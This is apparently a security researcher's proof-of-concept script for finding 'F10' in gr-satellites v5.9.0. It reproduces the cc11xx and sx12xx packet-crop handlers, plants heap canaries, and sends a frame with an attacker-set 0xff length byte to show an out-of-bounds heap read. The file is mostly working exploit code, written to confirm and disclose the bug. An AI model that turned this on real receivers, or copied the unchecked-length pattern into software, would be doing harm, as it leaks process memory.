#!/usr/bin/env python3
"""
F10 End-to-End PoC — PMT init_u8vector heap leak via attacker-controlled length

Validates:
  1. PMT init_u8vector(n, shorter_data) silently reads heap memory
  2. cc11xx_packet_crop.handle_msg() exhibits this when packet[0] is high
  3. sx12xx_packet_crop.handle_msg() exhibits the same pattern
  4. Heap leak is non-deterministic but reproducibly present

Methodology:
  - Verbatim reimplementation of both blocks' handle_msg from gr-satellites
    v5.9.0 sources (preserves the exact buggy call to pmt.init_u8vector)
  - Plant a "canary" sequence on the heap before triggering the bug
  - Verify canary bytes appear in output u8vector
"""

import gc
import pmt
import sys

# ---------------------------------------------------------------------------
# Verbatim from src/python/cc11xx_packet_crop.py
# (gr-satellites v5.9.0, lines 31-44)
# ---------------------------------------------------------------------------

def cc11xx_packet_crop_handle_msg(msg_pmt, use_crc16=True):
    msg = pmt.cdr(msg_pmt)
    if not pmt.is_u8vector(msg):
        print('[ERROR] Received invalid message type. Expected u8vector')
        return None
    packet = pmt.u8vector_elements(msg)

    crc_len = 2 if use_crc16 else 0
    packet_length = packet[0] + 1 + crc_len

    return pmt.cons(pmt.car(msg_pmt),
                    pmt.init_u8vector(packet_length, packet))


# ---------------------------------------------------------------------------
# Verbatim from src/python/sx12xx_packet_crop.py
# (gr-satellites v5.9.0, lines 35-47)
# ---------------------------------------------------------------------------

def sx12xx_packet_crop_handle_msg(msg_pmt, crc_len=2):
    msg = pmt.cdr(msg_pmt)
    if not pmt.is_u8vector(msg):
        print('[ERROR] Received invalid message type. Expected u8vector')
        return None
    packet = bytes(pmt.u8vector_elements(msg))

    packet_length = packet[0] + 1 + crc_len

    return pmt.cons(pmt.car(msg_pmt),
                    pmt.init_u8vector(packet_length, list(packet)))


# ---------------------------------------------------------------------------
# Test harness
# ---------------------------------------------------------------------------

CANARY = b'F10_HEAP_LEAK_CANARY_'
CANARY_REPEATS = 32   # plant the canary at many heap addresses to maximize
                      # collision probability with PMT vector allocations


def plant_heap_canaries():
    """
    Allocate many copies of a recognizable byte sequence in fresh PMT
    u8vectors, then drop the references so they become free heap chunks
    available for re-use by subsequent allocations.
    """
    canaries = []
    for i in range(CANARY_REPEATS):
        # build a unique-per-slot 64-byte canary so we can identify *which*
        # canary slot leaked
        marker = CANARY + bytes(f'{i:04d}_', 'ascii')
        marker = marker + b'X' * (64 - len(marker))
        v = pmt.init_u8vector(len(marker), list(marker))
        canaries.append(v)
    # release references so allocator can recycle the chunks
    del canaries
    gc.collect()


def build_rf_frame_with_high_length(rf_size=131, declared_length=0xff):
    """
    Simulate a 131-byte RF frame from sync_to_pdu_packed where the first
    byte (length field) is attacker-controlled to 0xff.
    """
    frame = bytearray(rf_size)
    frame[0] = declared_length            # ← attacker control
    # fill remaining bytes with a recognizable but non-canary pattern so we
    # can distinguish RF-buffer bytes from heap-leaked bytes in the output
    for i in range(1, rf_size):
        frame[i] = ord('a') + (i % 26)    # 'b', 'c', 'd' ... predictable
    return bytes(frame)


def make_pdu(data):
    """Wrap a bytes object as a PMT PDU (car=NIL, cdr=u8vector)."""
    return pmt.cons(pmt.PMT_NIL,
                    pmt.init_u8vector(len(data), list(data)))


def extract_output_bytes(result_pmt):
    """Pull the u8vector contents out of a PMT cons pair."""
    return bytes(pmt.u8vector_elements(pmt.cdr(result_pmt)))


def hexdump(data, tag, limit=320):
    """Print a hex dump with annotations."""
    print(f'\n  --- {tag} ({len(data)} bytes) ---')
    for offset in range(0, min(len(data), limit), 16):
        chunk = data[offset:offset+16]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f'  {offset:04x}  {hex_part:<48}  |{ascii_part}|')
    if len(data) > limit:
        print(f'  ... {len(data) - limit} more bytes ...')


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

def test_pmt_baseline():
    """Confirm pmt.init_u8vector(n, shorter) silently OOB-reads."""
    print('=' * 70)
    print('[1] PMT BASELINE — init_u8vector(10, [1,2,3,4,5])')
    print('=' * 70)
    v = pmt.init_u8vector(10, [1, 2, 3, 4, 5])
    arr = list(pmt.u8vector_elements(v))
    print(f'    result length: {len(arr)}')
    print(f'    bytes:         {arr}')
    if len(arr) == 10 and arr[:5] == [1, 2, 3, 4, 5]:
        leaked = arr[5:]
        all_zero = all(b == 0 for b in leaked)
        print(f'    bytes 5..9:    {leaked} (zeros? {all_zero})')
        if not all_zero:
            print('    [CONFIRMED] PMT reads uninitialized memory past source list')
            return True
        else:
            print('    Output is zero-filled — may have been allocated from cleared pool')
            return None
    return False


def test_cc11xx_isolated():
    """Trigger F10 in cc11xx_packet_crop directly."""
    print()
    print('=' * 70)
    print('[2] cc11xx_packet_crop — attacker length byte = 0xff')
    print('=' * 70)

    # Plant canaries first
    plant_heap_canaries()

    # Build the attack frame
    rf_frame = build_rf_frame_with_high_length(rf_size=131, declared_length=0xff)
    print(f'    RF frame: {len(rf_frame)} bytes, packet[0]=0x{rf_frame[0]:02x}')
    print(f'    Expected output length: {rf_frame[0]} + 1 + 2 = {rf_frame[0] + 3}')

    pdu = make_pdu(rf_frame)
    result = cc11xx_packet_crop_handle_msg(pdu, use_crc16=True)
    out = extract_output_bytes(result)

    print(f'    Output length: {len(out)} bytes')
    print(f'    Output[:131] matches RF buffer: {out[:131] == rf_frame}')

    if len(out) > 131:
        leaked = out[131:]
        print(f'    OOB read region: bytes {131}..{len(out)-1} = {len(leaked)} bytes')

        # Look for our canary marker in the leaked region
        canary_hit = CANARY in leaked
        print(f'    Canary "{CANARY.decode()}" present in OOB region: {canary_hit}')

        # Look for ANY non-zero byte (proves it's not zero-init memory)
        nonzero = sum(1 for b in leaked if b != 0)
        print(f'    Non-zero bytes in OOB region: {nonzero}/{len(leaked)}')

        hexdump(out, 'Full output (RF bytes 0-130, leaked bytes 131+)', limit=288)

        if canary_hit:
            offset = leaked.find(CANARY)
            print(f'\n    [CONFIRMED] Canary found at offset {131 + offset} in output')
            print(f'    Surrounding bytes: {leaked[offset:offset+64]!r}')
            return 'CANARY_LEAK'
        elif nonzero > 0:
            print('\n    [CONFIRMED] OOB region contains non-zero heap bytes')
            return 'HEAP_LEAK'
        else:
            print('\n    [INCONCLUSIVE] OOB region is all zeros — re-run to retry')
            return 'ZERO_FILL'

    return 'NO_LEAK'


def test_sx12xx_isolated():
    """Trigger F10 in sx12xx_packet_crop directly."""
    print()
    print('=' * 70)
    print('[3] sx12xx_packet_crop — attacker length byte = 0xff')
    print('=' * 70)

    plant_heap_canaries()

    rf_frame = build_rf_frame_with_high_length(rf_size=131, declared_length=0xff)
    pdu = make_pdu(rf_frame)
    result = sx12xx_packet_crop_handle_msg(pdu, crc_len=2)
    out = extract_output_bytes(result)

    print(f'    Output length: {len(out)} bytes')
    print(f'    Output[:131] matches RF buffer: {out[:131] == rf_frame}')

    if len(out) > 131:
        leaked = out[131:]
        canary_hit = CANARY in leaked
        nonzero = sum(1 for b in leaked if b != 0)
        print(f'    OOB region: {len(leaked)} bytes')
        print(f'    Canary present: {canary_hit}')
        print(f'    Non-zero bytes: {nonzero}/{len(leaked)}')

        if canary_hit:
            offset = leaked.find(CANARY)
            print(f'    [CONFIRMED] Canary at offset {131 + offset}')
            print(f'    Bytes around canary: {leaked[max(0,offset-8):offset+72]!r}')
            return 'CANARY_LEAK'
        elif nonzero > 0:
            return 'HEAP_LEAK'
        else:
            return 'ZERO_FILL'

    return 'NO_LEAK'


def test_stress_canary_collision():
    """
    Run many iterations to demonstrate that on at least one iteration the
    canary will land in the OOB read region. This proves the leak is real
    even when individual runs happen to read zero-filled pages.
    """
    print()
    print('=' * 70)
    print('[4] STRESS TEST — 100 iterations, count canary hits')
    print('=' * 70)

    canary_hits = 0
    heap_leaks = 0
    iterations = 100

    for it in range(iterations):
        plant_heap_canaries()
        rf_frame = build_rf_frame_with_high_length(rf_size=131,
                                                   declared_length=0xff)
        pdu = make_pdu(rf_frame)
        result = cc11xx_packet_crop_handle_msg(pdu, use_crc16=True)
        out = extract_output_bytes(result)
        if len(out) <= 131:
            continue
        leaked = out[131:]
        if CANARY in leaked:
            canary_hits += 1
        if any(b != 0 for b in leaked):
            heap_leaks += 1

    print(f'    Canary hits:    {canary_hits}/{iterations}')
    print(f'    Heap leaks:     {heap_leaks}/{iterations} (any non-zero OOB byte)')

    if canary_hits > 0:
        print('    [CONFIRMED] PMT init_u8vector reads canary bytes from heap')
    elif heap_leaks > 0:
        print('    [CONFIRMED] PMT init_u8vector reads non-zero heap bytes')
    else:
        print('    [UNEXPECTED] No OOB reads observed across 100 iterations')

    return canary_hits, heap_leaks


def main():
    print()
    print('#' * 70)
    print('# F10 PROOF-OF-EXPLOITABILITY — gr-satellites v5.9.0')
    print('# PMT init_u8vector heap leak via attacker-controlled length byte')
    print('#' * 70)

    results = {}
    results['baseline'] = test_pmt_baseline()
    results['cc11xx'] = test_cc11xx_isolated()
    results['sx12xx'] = test_sx12xx_isolated()
    results['stress'] = test_stress_canary_collision()

    print()
    print('=' * 70)
    print('SUMMARY')
    print('=' * 70)
    for k, v in results.items():
        print(f'  {k:12} : {v}')

    canary_hits, heap_leaks = results['stress']
    if canary_hits > 0:
        print()
        print('[PASS] F10 CONFIRMED — Plain heap memory from prior PMT allocations')
        print('       leaks into the output u8vector. Attacker controls 1 byte of')
        print('       RF; up to 127 bytes of heap leak per frame.')
        return 0
    elif heap_leaks > 10:
        print()
        print('[PASS] F10 CONFIRMED — OOB region consistently contains non-zero')
        print('       heap bytes, even without specific canary collisions.')
        return 0
    else:
        print()
        print('[INCONCLUSIVE] OOB read region appears zero-filled in this run.')
        print('              The bug exists (PMT does read past the source) but')
        print('              the heap allocator returns cleared pages in this')
        print('              configuration. Try with valgrind --track-origins=yes')
        print('              for kernel-cleared-page bypass.')
        return 1


if __name__ == '__main__':
    sys.exit(main())
